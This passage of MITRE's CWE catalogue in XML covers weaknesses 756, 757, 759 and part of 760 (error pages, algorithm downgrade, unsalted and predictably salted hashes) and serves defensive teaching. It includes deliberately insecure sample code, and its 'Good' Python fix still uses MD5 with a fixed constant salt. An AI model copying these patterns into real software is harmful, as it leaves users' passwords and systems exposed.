               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Special Element Injection</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="756" Name="Missing Custom Error Page" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product does not return custom error pages to the user, possibly exposing sensitive information.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="755" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="209" View_ID="1000"/>
         </Related_Weaknesses>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-76">
               <Intro_Text>In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things).</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:1em;">try {<xhtml:div style="margin-left:1em;">...</xhtml:div>} catch (ApplicationSpecificException ase) {<xhtml:div style="margin-left:1em;">logger.error("Caught: " + ase.toString());</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-75">
               <Intro_Text>The mode attribute of the &lt;customErrors&gt; tag in the Web.config file defines whether custom or default error pages are used.</Intro_Text>
               <Body_Text>In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>&lt;customErrors mode="Off" /&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned.</Body_Text>
               <Example_Code Nature="Good" Language="ASP.NET">
                  <xhtml:div>&lt;customErrors mode="RemoteOnly" /&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Another secure option is to set the mode attribute of the &lt;customErrors&gt; tag to use a custom page as follows:</Body_Text>
               <Example_Code Nature="Good" Language="ASP.NET">
                  <xhtml:div>&lt;customErrors mode="On" defaultRedirect="YourErrorPage.htm" /&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-03-03</Submission_Date>
               <Submission_Comment>New entry for reorganization of CWE-703.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="757" Name="Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.</Description>
         <Extended_Description>When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the product by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-4302</Reference>
               <Description>Attacker can select an older version of the software to exploit its vulnerabilities.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4407</Reference>
               <Description>Improper prioritization of encryption ciphers during negotiation leads to use of a weaker cipher.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4407</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2969</Reference>
               <Description>chain: SSL/TLS implementation disables a verification step (CWE-325) that enables a downgrade attack to a weaker protocol.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2969</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1444</Reference>
               <Description>Telnet protocol implementation allows downgrade to weaker authentication and encryption using an Adversary-in-the-Middle AITM attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1444</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1646</Reference>
               <Description>SSH server implementation allows override of configuration setting to use weaker authentication schemes. This may be a composite with CWE-642.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1646</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="220"/>
            <Related_Attack_Pattern CAPEC_ID="606"/>
            <Related_Attack_Pattern CAPEC_ID="620"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This is related to CWE-300, although not all downgrade attacks necessarily require an entity that redirects or interferes with the network.  See examples.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-03-03</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="759" Name="Use of a One-Way Hash without a Salt" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product does not also use a salt as part of the input.</Description>
         <Extended_Description>
            <xhtml:p>This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.</xhtml:p>
            <xhtml:p>It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="916" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attacker can gain access to the hashes, then the lack of a salt makes it easier to conduct brute force attacks using techniques such as rainbow tables.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-101">
               <Intro_Text>In both of these examples, a user is logged in if their given password matches a stored password:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>unsigned char *check_passwd(char *plaintext) {<xhtml:div style="margin-left:1em;">ctext = simple_digest("sha1",plaintext,strlen(plaintext), ... );<xhtml:br/>
                        <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                        <xhtml:br/>if (equal(ctext, secret_password())) {<xhtml:div style="margin-left:1em;">login_user();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String plainText = new String(plainTextIn);<xhtml:br/>MessageDigest encer = MessageDigest.getInstance("SHA");<xhtml:br/>encer.update(plainTextIn);<xhtml:br/>byte[] digest = password.digest();<xhtml:br/>
                     <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                     <xhtml:br/>if (equal(digest,secret_password())) {<xhtml:div style="margin-left:1em;">login_user();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328).  It also does not use a salt (CWE-759).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>def storePassword(userName,Password):<xhtml:div style="margin-left:1em;">hasher = hashlib.new('md5')<xhtml:br/>hasher.update(Password)<xhtml:br/>hashedPassword = hasher.digest()<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i># UpdateUserLogin returns True on success, False otherwise</xhtml:i>
                        <xhtml:br/>return updateUserLogin(userName,hashedPassword)</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised.</Body_Text>
               <Body_Text>Fixing this is as simple as providing a salt to the hashing function on initialization:</Body_Text>
               <Example_Code Nature="Good" Language="Python">
                  <xhtml:div>def storePassword(userName,Password):<xhtml:div style="margin-left:1em;">hasher = hashlib.new('md5',b'SaltGoesHere')<xhtml:br/>hasher.update(Password)<xhtml:br/>hashedPassword = hasher.digest()<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i># UpdateUserLogin returns True on success, False otherwise</xhtml:i>
                        <xhtml:br/>return updateUserLogin(userName,hashedPassword)</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-1526</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1526</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1058</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-1058</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-631"/>
            <Reference External_Reference_ID="REF-632"/>
            <Reference External_Reference_ID="REF-633"/>
            <Reference External_Reference_ID="REF-634"/>
            <Reference External_Reference_ID="REF-635"/>
            <Reference External_Reference_ID="REF-636"/>
            <Reference External_Reference_ID="REF-637"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Creating a Salted Hash&#34; Page 302"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Salt Values&#34;, Page 46"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-03-03</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, References, Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="760" Name="Use of a One-Way Hash with a Predictable Salt" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product uses a predictable salt as part of the input.</Description>
         <Extended_Description>
            <xhtml:p>This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.</xhtml:p>
            <xhtml:p>It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="916" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
